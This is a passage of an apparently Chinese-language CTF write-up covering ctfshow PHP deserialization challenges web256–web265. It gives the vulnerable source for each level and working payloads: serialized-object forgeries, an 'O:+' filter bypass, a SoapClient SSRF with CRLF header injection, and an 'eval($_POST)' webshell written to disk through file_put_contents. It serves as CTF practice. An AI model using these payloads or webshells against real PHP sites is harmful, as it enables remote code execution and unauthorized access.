if($user-&gt;checkVip())&#123;</span><br><span class="line">            $user-&gt;vipOneKeyGetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;no vip,no flag&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>序列化下面一段代码，即序列化一段内容将$isVip=true</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span><br></pre></td></tr></table></figure><p>还要设置一下username和password</p><h2 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line"></span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    public $username=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $password=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $isVip=false;</span><br><span class="line"></span><br><span class="line">    public function checkVip()&#123;</span><br><span class="line">        return $this-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    public function login($u,$p)&#123;</span><br><span class="line">        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;</span><br><span class="line">    &#125;</span><br><span class="line">    public function vipOneKeyGetFlag()&#123;</span><br><span class="line">        if($this-&gt;isVip)&#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            if($this-&gt;username!==$this-&gt;password)&#123;</span><br><span class="line">                    echo &quot;your flag is &quot;.$flag;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;no vip, no flag&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username=$_GET[&#x27;username&#x27;];</span><br><span class="line">$password=$_GET[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($username) &amp;&amp; isset($password))&#123;</span><br><span class="line">    $user = unserialize($_COOKIE[&#x27;user&#x27;]);    </span><br><span class="line">    if($user-&gt;login($username,$password))&#123;</span><br><span class="line">        if($user-&gt;checkVip())&#123;</span><br><span class="line">            $user-&gt;vipOneKeyGetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;no vip,no flag&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>多了一个判断$this-&gt;username!==$this-&gt;password</p><p>序列化的对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A4%3A%22xxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=xxxxxx&amp;password=xxxx</span><br></pre></td></tr></table></figure><h2 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    private $username=&#x27;xxxxxx&#x27;;</span><br><span class="line">    private $password=&#x27;xxxxxx&#x27;;</span><br><span class="line">    private $isVip=false;</span><br><span class="line">    private $class = &#x27;info&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;class=new info();</span><br><span class="line">    &#125;</span><br><span class="line">    public function login($u,$p)&#123;</span><br><span class="line">        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $this-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class info&#123;</span><br><span class="line">    private $user=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public function getInfo()&#123;</span><br><span class="line">        return $this-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class backDoor&#123;</span><br><span class="line">    private $code;</span><br><span class="line">    public function getInfo()&#123;</span><br><span class="line">        eval($this-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username=$_GET[&#x27;username&#x27;];</span><br><span class="line">$password=$_GET[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($username) &amp;&amp; isset($password))&#123;</span><br><span class="line">    $user = unserialize($_COOKIE[&#x27;user&#x27;]);</span><br><span class="line">    $user-&gt;login($username,$password);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将构造函数 new info改为backDoor</p><p>然后将backDoor类中的code改为eval($_POST[1]);</p><p>序列化后成功rce</p><h2 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    public $username=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $password=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $isVip=false;</span><br><span class="line">    public $class = &#x27;info&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;class=new info();</span><br><span class="line">    &#125;</span><br><span class="line">    public function login($u,$p)&#123;</span><br><span class="line">        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $this-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class info&#123;</span><br><span class="line">    public $user=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public function getInfo()&#123;</span><br><span class="line">        return $this-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class backDoor&#123;</span><br><span class="line">    public $code;</span><br><span class="line">    public function getInfo()&#123;</span><br><span class="line">        eval($this-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username=$_GET[&#x27;username&#x27;];</span><br><span class="line">$password=$_GET[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($username) &amp;&amp; isset($password))&#123;</span><br><span class="line">    if(!preg_match(&#x27;/[oc]:\d+:/i&#x27;, $_COOKIE[&#x27;user&#x27;]))&#123;</span><br><span class="line">        $user = unserialize($_COOKIE[&#x27;user&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line">    $user-&gt;login($username,$password);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加了过滤，所以将O:10: 改成O:+10:即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A0%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A16%3A%22eval%28%24_POST%5B1%5D%29%3B%22%3B%7D%7D</span><br></pre></td></tr></table></figure><h2 id="web259-call"><a href="#web259-call" class="headerlink" title="web259(__call())"></a>web259(__call())</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$vip = unserialize($_GET[&#x27;vip&#x27;]);</span><br><span class="line">//vip can get flag one key</span><br><span class="line">$vip-&gt;getFlag();</span><br></pre></td></tr></table></figure><blockquote><p>flag.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$xff = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]);</span><br><span class="line">array_pop($xff);</span><br><span class="line">$ip = array_pop($xff);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($ip!==&#x27;127.0.0.1&#x27;)&#123;</span><br><span class="line">die(&#x27;error&#x27;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$token = $_POST[&#x27;token&#x27;];</span><br><span class="line">if($token==&#x27;ctfshow&#x27;)&#123;</span><br><span class="line">file_put_contents(&#x27;flag.txt&#x27;,$flag);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>因为getflag未知，<code>__call()</code>是一个魔术方法，当调用一个对象中的不能用的方法的时候就回执行这个函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public __call ( string $name , array $arguments )</span><br></pre></td></tr></table></figure><p>所以构造一个class利用其__call方法传参</p><p>payload.php:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $ua=&quot;ctfshow\r\nX-Forwarded-For:127.0.0.1,127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow&quot;;</span><br><span class="line">    $client= new SoapClient(null,array(&#x27;uri&#x27;=&gt;&#x27;http:127.0.0.1&#x27;,&#x27;location&#x27;=&gt;&#x27;http://127.0.0.1/flag.php&#x27;,&#x27;user_agent&#x27;=&gt;$ua));</span><br><span class="line"></span><br><span class="line">    $ser=urlencode(serialize($client));</span><br><span class="line">    echo $ser;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line"></span><br><span class="line">if(preg_match(&#x27;/ctfshow_i_love_36D/&#x27;,serialize($_GET[&#x27;ctfshow&#x27;])))&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个没什么可说的，直接摆上就行了</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow=ctfshow_i_love_36D</span><br></pre></td></tr></table></figure><h2 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class ctfshowvip&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    public $code;</span><br><span class="line"></span><br><span class="line">    public function __construct($u,$p)&#123;</span><br><span class="line">        $this-&gt;username=$u;</span><br><span class="line">        $this-&gt;password=$p;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if($this-&gt;username!=&#x27;&#x27; || $this-&gt;password!=&#x27;&#x27;)&#123;</span><br><span class="line">            die(&#x27;error&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        eval($this-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __sleep()&#123;</span><br><span class="line">        $this-&gt;username=&#x27;&#x27;;</span><br><span class="line">        $this-&gt;password=&#x27;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __unserialize($data)&#123;</span><br><span class="line">        $this-&gt;username=$data[&#x27;username&#x27;];</span><br><span class="line">        $this-&gt;password=$data[&#x27;password&#x27;];</span><br><span class="line">        $this-&gt;code = $this-&gt;username.$this-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        if($this-&gt;code==0x36d)&#123;</span><br><span class="line">            file_put_contents($this-&gt;username, $this-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize($_GET[&#x27;vip&#x27;]);</span><br></pre></td></tr></table></figure><p>版本问题，由于有__unserialize，的存在是不执行__wakeup方法的，所以直接控制这个销毁方法即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class ctfshowvip&#123;</span><br><span class="line">        public $username;</span><br><span class="line">        public $password;</span><br><span class="line">        public $code;</span><br><span class="line">    </span><br><span class="line">        public function __construct($u=&#x27;&#x27;,$p=&#x27;&#x27;)&#123;</span><br><span class="line">            $this-&gt;username=&quot;877.php&quot;;</span><br><span class="line">            $this-&gt;password=&#x27;&lt;?php eval($_POST[a]); ?&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>序列化后内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A10%3A%22ctfshowvip%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22877.php%22%3Bs%3A8%3A%22password%22%3Bs%3A25%3A%22%3C%3Fphp+eval%28%24_POST%5Ba%5D%29%3B+%3F%3E%22%3Bs%3A4%3A%22code%22%3BN%3B%7D</span><br></pre></td></tr></table></figure><h2 id="web262-字符逃逸"><a href="#web262-字符逃逸" class="headerlink" title="web262(字符逃逸)"></a>web262(字符逃逸)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">class message&#123;</span><br><span class="line">    public $from;</span><br><span class="line">    public $msg;</span><br><span class="line">    public $to;</span><br><span class="line">    public $token=&#x27;user&#x27;;</span><br><span class="line">    public function __construct($f,$m,$t)&#123;</span><br><span class="line">        $this-&gt;from = $f;</span><br><span class="line">        $this-&gt;msg = $m;</span><br><span class="line">        $this-&gt;to = $t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$f = $_GET[&#x27;f&#x27;];</span><br><span class="line">$m = $_GET[&#x27;m&#x27;];</span><br><span class="line">$t = $_GET[&#x27;t&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t))&#123;</span><br><span class="line">    $msg = new message($f,$m,$t);</span><br><span class="line">    $umsg = str_replace(&#x27;fuck&#x27;, &#x27;loveU&#x27;, serialize($msg));</span><br><span class="line">    setcookie(&#x27;msg&#x27;,base64_encode($umsg));</span><br><span class="line">    echo &#x27;Your message has been sent&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>因为替换前后长度不一致导致了逃逸，<a href="https://zhuanlan.zhihu.com/p/330670521">细说php反序列化字符逃逸 - 知乎 (zhihu.com)</a></p><p>所以我们构造fuck讲token的值由user改为admin即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$us=new message(&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:3:&quot;msg&quot;;s:4:&quot;aaaa&quot;;s:2:&quot;to&quot;;s:4:&quot;aaaa&quot;;s:5:&quot;token&quot;;s:4:&quot;admin&quot;;&#125;&#x27;,&#x27;aaaa&#x27;,&#x27;aaaa&#x27;);</span><br></pre></td></tr></table></figure><p>靠把fuck变成loveU每次多一个字符把后面的字符全部给搞进来</p><h2 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h2><p>存在文件泄露/<a href="http://www.zip/">www.zip</a></p><p>读index.php没有读到什么东西，继续看check.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">class User&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    public $status;</span><br><span class="line">    function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">    function setStatus($s)&#123;</span><br><span class="line">        $this-&gt;status=$s;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        file_put_contents(&quot;log-&quot;.$this-&gt;username, &quot;使用&quot;.$this-&gt;password.&quot;登陆&quot;.($this-&gt;status?&quot;成功&quot;:&quot;失败&quot;).&quot;----&quot;.date_create()-&gt;format(&#x27;Y-m-d H:i:s&#x27;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的file_put_contents可以利用，此处存在username和password可控，我们从此处写入文件，传马🐎开搞！</p><p>构造反序列化，利用他的这个配置问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;1.php&quot;;s:8:&quot;password&quot;;s:25:&quot;&quot;;s:6:&quot;status&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p>base64编码下，访问log-1.php</p><p>getshell</p><h2 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># @message.php</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">class message&#123;</span><br><span class="line">    public $from;</span><br><span class="line">    public $msg;</span><br><span class="line">    public $to;</span><br><span class="line">    public $token=&#x27;user&#x27;;</span><br><span class="line">    public function __construct($f,$m,$t)&#123;</span><br><span class="line">        $this-&gt;from = $f;</span><br><span class="line">        $this-&gt;msg = $m;</span><br><span class="line">        $this-&gt;to = $t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$f = $_GET[&#x27;f&#x27;];</span><br><span class="line">$m = $_GET[&#x27;m&#x27;];</span><br><span class="line">$t = $_GET[&#x27;t&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t))&#123;</span><br><span class="line">    $msg = new message($f,$m,$t);</span><br><span class="line">    $umsg = str_replace(&#x27;fuck&#x27;, &#x27;loveU&#x27;, serialize($msg));</span><br><span class="line">    $_SESSION[&#x27;msg&#x27;]=base64_encode($umsg);</span><br><span class="line">    echo &#x27;Your message has been sent&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><p>有点故技重施的意思，又是因为替换的字符和原来长度不一致，导致我可以任意写入内容了，爱住了。</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f=1&amp;m=flag&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure><h2 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class ctfshowAdmin&#123;</span><br><span class="line">    public $token;</span><br><span class="line">    public $password;</span><br><span class="line"></span><br><span class="line">    public function __construct($t,$p)&#123;</span><br><span class="line">        $this-&gt;token=$t;</span><br><span class="line">        $this-&gt;password = $p;</span><br><span class="line">    &#125;</span><br><span class="line">    public function login()&#123;</span><br><span class="line">        return $this-&gt;token===$this-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ctfshow = unserialize($_GET[&#x27;ctfshow&#x27;]);</span><br><span class="line">$ctfshow-&gt;token=md5(mt_rand());</span><br><span class="line"></span><br><span class="line">if($ctfshow-&gt;login())&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次有点不好搞因为太随机了</p><p>但这次用了一招，类似c++里面的引用，就是讲password搞成token的别名，让他的值随着token变。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 